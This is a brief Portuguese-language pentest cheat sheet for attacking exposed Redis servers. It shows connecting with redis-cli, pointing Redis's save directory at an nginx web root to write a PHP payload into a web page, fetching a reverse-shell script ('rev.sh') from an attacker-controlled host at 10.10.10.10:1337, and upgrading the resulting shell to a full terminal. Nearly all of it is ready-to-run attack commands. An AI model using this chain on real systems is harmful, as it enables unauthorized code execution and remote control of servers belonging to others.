Redis
========================

    redis-cli -h <hostname>
    
Obter informações do banco de dados
    
    INFO

Setar um payload
    config set dir /usr/share/nginx/html 
    set test "<?php phpinfo(); ?>"
    save
 
    curl 10.10.10.10:1337/rev.sh
    
    script -c /bin/bash /dev/null
    <CTRL + Z>
    stty -a
    stty -echo raw && fg
    export TERM=xterm
    stty rows 38 columns 116